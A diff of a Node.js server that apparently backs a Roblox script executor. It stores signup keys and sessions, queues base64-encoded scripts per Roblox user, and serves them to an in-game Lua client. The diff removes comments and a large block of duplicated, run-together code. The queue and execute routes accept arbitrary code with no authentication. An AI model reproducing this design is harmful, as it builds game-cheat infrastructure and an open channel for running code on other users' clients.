@@ -24,7 +24,7 @@ const USERS_FILE = path.join(DATA_DIR, 'users.json');
 const KEYS_FILE = path.join(DATA_DIR, 'keys.json');
 const GAMES_FILE = path.join(DATA_DIR, 'games.json');
 
-// In‑memory storage (loaded from files)
+// In‑memory storage
 let games = new Map();
 let users = new Map();
 let validKeys = new Map();
@@ -55,7 +55,6 @@ function loadData() {
     } catch (e) { console.error('Failed to load games:', e.message); }
 }
 
-// Save functions
 function saveUsers() {
     try {
         fs.writeFileSync(USERS_FILE, JSON.stringify(Object.fromEntries(users), null, 2));
@@ -74,12 +73,8 @@ function saveGames() {
     } catch (e) { console.error('Failed to save games:', e.message); }
 }
 
-// Load existing data
 loadData();
 
-// ========================
-// Helper: get Roblox ID
-// ========================
 async function getRobloxIdFromUsername(username) {
     try {
         const res = await axios.post('https://users.roblox.com/v1/usernames/users', {
@@ -92,9 +87,7 @@ async function getRobloxIdFromUsername(username) {
     }
 }
 
-// ========================
-// Default admin account (CEO)
-// ========================
+// Default admin account
 (async () => {
     const adminEmail = 'admin@monoxide.local';
     if (!users.has(adminEmail)) {
@@ -112,8 +105,9 @@ async function getRobloxIdFromUsername(username) {
 })();
 
 // ========================
-// Admin key generation (CEO only)
+// API Routes
 // ========================
+
 app.post('/api/admin/generate-key', (req, res) => {
     const { adminToken } = req.body;
     const adminUser = Array.from(users.values()).find(u => u.token === adminToken && u.role === 'CEO');
@@ -132,9 +126,6 @@ app.post('/api/admin/generate-key', (req, res) => {
     res.json({ key });
 });
 
-// ========================
-// Verify key
-// ========================
 app.post('/api/verify-key', (req, res) => {
     const { key } = req.body;
     if (!key) return res.status(400).json({ error: 'Missing key' });
@@ -144,15 +135,11 @@ app.post('/api/verify-key', (req, res) => {
     res.json({ valid: true });
 });
 
-// ========================
-// Signup
-// ========================
 app.post('/api/signup', async (req, res) => {
     const { key, email, password, username } = req.body;
     if (!key || !email || !password || !username) {
         return res.status(400).json({ error: 'Missing fields' });
     }
-
     const keyData = validKeys.get(key);
     if (!keyData) return res.status(400).json({ error: 'Invalid or expired key' });
     if (keyData.used) return res.status(400).json({ error: 'Key already used' });
@@ -167,9 +154,6 @@ app.post('/api/signup', async (req, res) => {
     res.json({ success: true });
 });
 
-// ========================
-// Login
-// ========================
 app.post('/api/login', async (req, res) => {
     const { email, password } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
@@ -187,9 +171,6 @@ app.post('/api/login', async (req, res) => {
     res.json({ success: true, token, username: user.username, role: user.role });
 });
 
-// ========================
-// Verify token
-// ========================
 app.post('/api/verify-token', (req, res) => {
     const { token } = req.body;
     if (!token) return res.status(401).json({ valid: false });
@@ -198,9 +179,6 @@ app.post('/api/verify-token', (req, res) => {
     res.json({ valid: true, username: user.username, role: user.role });
 });
 
-// ========================
-// Set Roblox username
-// ========================
 app.post('/api/set-username', async (req, res) => {
     const { username, token } = req.body;
     if (!username || !token) return res.status(400).json({ error: 'Missing fields' });
@@ -219,16 +197,10 @@ app.post('/api/set-username', async (req, res) => {
     res.json({ success: true, robloxId, username });
 });
 
-// ========================
-// Get linked username
-// ========================
 app.get('/api/getuser', (req, res) => {
     res.type('text/plain').send(linkedUsername || '');
 });
 
-// ========================
-// Queue script
-// ========================
 app.post('/api/queue-script', (req, res) => {
     const { roblox_userid, script } = req.body;
     if (!roblox_userid || !script) return res.status(400).json({ error: 'Missing fields' });
@@ -246,9 +218,6 @@ app.post('/api/queue-script', (req, res) => {
     res.json({ success: true, queued: queuedScripts.get(roblox_userid).length });
 });
 
-// ========================
-// Execute script
-// ========================
 app.get('/api/execute', (req, res) => {
     const { user } = req.query;
     if (!user) return res.status(400).send('');
@@ -268,9 +237,6 @@ app.get('/api/execute', (req, res) => {
     res.type('text/plain').send(decoded);
 });
 
-// ========================
-// Game reporting
-// ========================
 app.post('/api/report', (req, res) => {
     const game = req.body;
     if (!game.id && !game.placeId) return res.status(400).json({ error: 'Missing placeId' });
@@ -308,12 +274,8 @@ app.get('/api/games', (req, res) => {
     res.json(activeGames);
 });
 
-// ========================
-// Health check
-// ========================
 app.get('/api/health', (req, res) => res.json({ status: 'ok' }));
 
-// Cleanup old games
 setInterval(() => {
     const now = Date.now();
     let changed = false;
@@ -324,316 +286,6 @@ setInterval(() => {
         }
     }
     if (changed) saveGames();
-}, 60 * 1000);
-
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));    saveUsers();
-    saveKeys();
-    res.json({ success: true });
-});
-
-// ========================
-// Login
-// ========================
-app.post('/api/login', async (req, res) => {
-    const { email, password } = req.body;
-    if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
-
-    const user = users.get(email);
-    if (!user) return res.status(401).json({ error: 'Invalid email or password' });
-
-    const match = await bcrypt.compare(password, user.passwordHash);
-    if (!match) return res.status(401).json({ error: 'Invalid email or password' });
-
-    const token = crypto.randomBytes(32).toString('hex');
-    user.token = token;
-    users.set(email, user);
-    saveUsers();
-    res.json({ success: true, token, username: user.username, role: user.role });
-});
-
-// ========================
-// Verify token
-// ========================
-app.post('/api/verify-token', (req, res) => {
-    const { token } = req.body;
-    if (!token) return res.status(401).json({ valid: false });
-    const user = Array.from(users.values()).find(u => u.token === token);
-    if (!user) return res.status(401).json({ valid: false });
-    res.json({ valid: true, username: user.username, role: user.role });
-});
-
-// ========================
-// Set Roblox username
-// ========================
-app.post('/api/set-username', async (req, res) => {
-    const { username, token } = req.body;
-    if (!username || !token) return res.status(400).json({ error: 'Missing fields' });
-
-    const user = Array.from(users.values()).find(u => u.token === token);
-    if (!user) return res.status(401).json({ error: 'Invalid session' });
-
-    const robloxId = await getRobloxIdFromUsername(username);
-    if (!robloxId) return res.status(400).json({ error: 'Invalid Roblox username' });
-
-    user.robloxUsername = username;
-    user.robloxId = robloxId;
-    users.set(user.email, user);
-    linkedUsername = username;
-    saveUsers();
-    res.json({ success: true, robloxId, username });
-});
-
-// ========================
-// Get linked username
-// ========================
-app.get('/api/getuser', (req, res) => {
-    res.type('text/plain').send(linkedUsername || '');
-});
-
-// ========================
-// Queue script
-// ========================
-app.post('/api/queue-script', (req, res) => {
-    const { roblox_userid, script } = req.body;
-    if (!roblox_userid || !script) return res.status(400).json({ error: 'Missing fields' });
-
-    if (!queuedScripts.has(roblox_userid)) {
-        queuedScripts.set(roblox_userid, []);
-    }
-    queuedScripts.get(roblox_userid).push({
-        id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
-        code: Buffer.from(script).toString('base64'),
-        status: 'QUEUED',
-        queued_at: new Date().toISOString()
-    });
-
-    res.json({ success: true, queued: queuedScripts.get(roblox_userid).length });
-});
-
-// ========================
-// Execute script
-// ========================
-app.get('/api/execute', (req, res) => {
-    const { user } = req.query;
-    if (!user) return res.status(400).send('');
-
-    const userObj = Array.from(users.values()).find(u =>
-        u.robloxUsername === user || u.username === user
-    );
-    if (!userObj || !userObj.robloxId) return res.send('');
-
-    const scripts = queuedScripts.get(userObj.robloxId) || [];
-    if (scripts.length === 0) return res.send('');
-
-    const script = scripts.shift();
-    queuedScripts.set(userObj.robloxId, scripts);
-
-    const decoded = Buffer.from(script.code, 'base64').toString('utf-8');
-    res.type('text/plain').send(decoded);
-});
-
-// ========================
-// Game reporting
-// ========================
-app.post('/api/report', (req, res) => {
-    const game = req.body;
-    if (!game.id && !game.placeId) return res.status(400).json({ error: 'Missing placeId' });
-    const placeId = game.id || game.placeId;
-    const playing = game.players || game.playing || 0;
-
-    const storedGame = {
-        placeId,
-        name: game.name || '',
-        playing,
-        thumbnail: game.thumbnail || '',
-        visits: game.visits || '',
-        creator: game.creator || '',
-        creator_id: game.creator_id || '',
-        maxPlayers: game.max_players || '',
-        genre: game.genre || '',
-        created: game.created || '',
-        voice: game.voice || '',
-        rig: game.rig || '',
-        joinUrl: `https://www.roblox.com/games/${placeId}/-`,
-        reportedAt: Date.now()
-    };
-
-    games.set(placeId.toString(), storedGame);
-    saveGames();
-    res.json({ success: true });
-});
-
-app.get('/api/games', (req, res) => {
-    const now = Date.now();
-    const oneHour = 60 * 60 * 1000;
-    const activeGames = Array.from(games.values())
-        .filter(g => g.playing > 0 && (now - g.reportedAt) < oneHour)
-        .sort((a, b) => b.playing - a.playing);
-    res.json(activeGames);
-});
-
-// ========================
-// Health check
-// ========================
-app.get('/api/health', (req, res) => res.json({ status: 'ok' }));
-
-// Cleanup old games
-setInterval(() => {
-    const now = Date.now();
-    let changed = false;
-    for (const [placeId, game] of games) {
-        if (now - game.reportedAt > 3600000) {
-            games.delete(placeId);
-            changed = true;
-        }
-    }
-    if (changed) saveGames();
-}, 60 * 1000);
-
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));    const user = users.get(email);
-    if (!user) return res.status(401).json({ error: 'Invalid email or password' });
-
-    const match = await bcrypt.compare(password, user.passwordHash);
-    if (!match) return res.status(401).json({ error: 'Invalid email or password' });
-
-    const token = crypto.randomBytes(32).toString('hex');
-    user.token = token;
-    users.set(email, user);
-    res.json({ success: true, token, username: user.username, role: user.role });
-});
-
-// ========================
-// Verify session token
-// ========================
-app.post('/api/verify-token', (req, res) => {
-    const { token } = req.body;
-    if (!token) return res.status(401).json({ valid: false });
-    const user = Array.from(users.values()).find(u => u.token === token);
-    if (!user) return res.status(401).json({ valid: false });
-    res.json({ valid: true, username: user.username, role: user.role });
-});
-
-// ========================
-// Link Roblox username (fetches ID and stores it)
-// ========================
-app.post('/api/set-username', async (req, res) => {
-    const { username, token } = req.body;
-    if (!username || !token) return res.status(400).json({ error: 'Missing fields' });
-
-    const user = Array.from(users.values()).find(u => u.token === token);
-    if (!user) return res.status(401).json({ error: 'Invalid session' });
-
-    const robloxId = await getRobloxIdFromUsername(username);
-    if (!robloxId) return res.status(400).json({ error: 'Invalid Roblox username' });
-
-    user.robloxUsername = username;
-    user.robloxId = robloxId;
-    users.set(user.email, user);
-    linkedUsername = username;
-
-    res.json({ success: true, robloxId, username });
-});
-
-// ========================
-// Get current linked username (used by Lua script)
-// ========================
-app.get('/api/getuser', (req, res) => {
-    res.type('text/plain').send(linkedUsername || '');
-});
-
-// ========================
-// Queue script for a user (called by Executor page)
-// ========================
-app.post('/api/queue-script', (req, res) => {
-    const { roblox_userid, script } = req.body;
-    if (!roblox_userid || !script) return res.status(400).json({ error: 'Missing fields' });
-
-    if (!queuedScripts.has(roblox_userid)) {
-        queuedScripts.set(roblox_userid, []);
-    }
-    queuedScripts.get(roblox_userid).push({
-        id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
-        code: Buffer.from(script).toString('base64'),
-        status: 'QUEUED',
-        queued_at: new Date().toISOString()
-    });
-
-    res.json({ success: true, queued: queuedScripts.get(roblox_userid).length });
-});
-
-// ========================
-// Execute: return next script for the given user
-// ========================
-app.get('/api/execute', (req, res) => {
-    const { user } = req.query;
-    if (!user) return res.status(400).send('');
-
-    const userObj = Array.from(users.values()).find(u =>
-        u.robloxUsername === user || u.username === user
-    );
-    if (!userObj || !userObj.robloxId) return res.send('');
-
-    const scripts = queuedScripts.get(userObj.robloxId) || [];
-    if (scripts.length === 0) return res.send('');
-
-    const script = scripts.shift();
-    queuedScripts.set(userObj.robloxId, scripts);
-
-    const decoded = Buffer.from(script.code, 'base64').toString('utf-8');
-    res.type('text/plain').send(decoded);
-});
-
-// ========================
-// Game reporting (for Game Library)
-// ========================
-app.post('/api/report', (req, res) => {
-    const game = req.body;
-    if (!game.id && !game.placeId) return res.status(400).json({ error: 'Missing placeId' });
-    const placeId = game.id || game.placeId;
-    const playing = game.players || game.playing || 0;
-
-    const storedGame = {
-        placeId,
-        name: game.name || '',
-        playing,
-        thumbnail: game.thumbnail || '',
-        visits: game.visits || '',
-        creator: game.creator || '',
-        creator_id: game.creator_id || '',
-        maxPlayers: game.max_players || '',
-        genre: game.genre || '',
-        created: game.created || '',
-        voice: game.voice || '',
-        rig: game.rig || '',
-        joinUrl: `https://www.roblox.com/games/${placeId}/-`,
-        reportedAt: Date.now()
-    };
-
-    games.set(placeId, storedGame);
-    res.json({ success: true });
-});
-
-app.get('/api/games', (req, res) => {
-    const now = Date.now();
-    const oneHour = 60 * 60 * 1000;
-    const activeGames = Array.from(games.values())
-        .filter(g => g.playing > 0 && (now - g.reportedAt) < oneHour)
-        .sort((a, b) => b.playing - a.playing);
-    res.json(activeGames);
-});
-
-// ========================
-// Health check
-// ========================
-app.get('/api/health', (req, res) => res.json({ status: 'ok' }));
-
-// Cleanup old games every minute
-setInterval(() => {
-    const now = Date.now();
-    const oneHour = 60 * 60 * 1000;
-    for (const [placeId, game] of games) {
-        if (now - game.reportedAt > oneHour) games.delete(placeId);
-    }
 }, 60 * 1000);
 
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
